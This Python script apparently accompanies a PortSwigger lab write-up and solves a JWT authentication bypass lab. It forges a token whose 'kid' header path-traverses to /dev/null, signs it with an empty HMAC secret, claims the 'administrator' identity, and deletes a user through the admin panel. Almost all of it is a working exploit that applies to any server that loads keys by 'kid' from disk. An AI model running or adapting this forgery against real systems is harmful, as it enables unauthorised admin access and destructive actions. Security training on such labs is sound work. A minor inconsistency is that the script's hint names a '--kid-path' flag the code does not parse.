#!/usr/bin/env python3
"""
JWT authentication bypass via kid header path traversal
PortSwigger Web Security Academy -- JWT

Companion script for the writeup: 06-kid-header-path-traversal.md

What this does:
    Logs in to get a genuine session JWT, then forges a new one whose "kid"
    header is a path traversal sequence reaching /dev/null and whose
    algorithm is HS256, signed with an empty-string HMAC secret. If the
    server resolves its verification key by reading a file named after
    "kid" straight off disk, /dev/null always reads back as zero bytes --
    so signing with an empty secret matches what the server computes when
    it reads the same empty file. Sending that as the session cookie to
    /admin, then deleting carlos, solves the lab.

    /dev/zero and /proc/sys/kernel/hostname are documented alternate
    traversal targets if /dev/null isn't reachable from a given server's
    working directory -- this script defaults to /dev/null since that's
    what solved the real lab, but accepts an override.

Usage:
    python 06-kid-header-path-traversal.py <lab-url> [kid-path]
    e.g. python 06-kid-header-path-traversal.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net
    e.g. python 06-kid-header-path-traversal.py <lab-url> ../../../dev/zero

Requirements:
    pip install httpx
"""

import base64
import hashlib
import hmac
import json
import re
import sys
import httpx


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def encode_jwt(header: dict, payload: dict, secret: bytes, algorithm: str = "HS256") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def exploit_forge_kid_traversal(jwt_token: str, new_claims: dict,
                                 kid_path: str = "../../../dev/null", secret: str = "") -> str:
    """Forge a JWT with kid path traversal pointing to a known-empty file, signed with an empty secret."""
    header, payload, _ = decode_jwt(jwt_token)
    payload.update(new_claims)
    header["kid"] = kid_path
    header["alg"] = "HS256"
    return encode_jwt(header, payload, secret.encode(), "HS256")


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> str:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""

    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": username, "password": password
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return client.cookies.get("session", "")


def solve(lab_url: str, kid_path: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url)
    if not session:
        print("[-] Login failed")
        return
    print(f"[+] Got session JWT: {session[:50]}...")

    forged = exploit_forge_kid_traversal(session, {"sub": "administrator"}, kid_path, secret="")
    print(f"[+] Forged token with kid={kid_path!r}, signed with empty secret")

    client.cookies.clear()
    client.cookies.set("session", forged)
    r = client.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {r.status_code}")

    if "/admin/delete" in r.text:
        r = client.get(f"{lab_url}/admin/delete?username=carlos")
        print(f"[*] Delete carlos -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- try --kid-path ../../../dev/zero or ../../../proc/sys/kernel/hostname")


if __name__ == "__main__":
    if len(sys.argv) not in (2, 3):
        print(f"Usage: python {sys.argv[0]} <lab-url> [kid-path]")
        sys.exit(1)
    kid = sys.argv[2] if len(sys.argv) == 3 else "../../../dev/null"
    solve(sys.argv[1].rstrip("/"), kid)
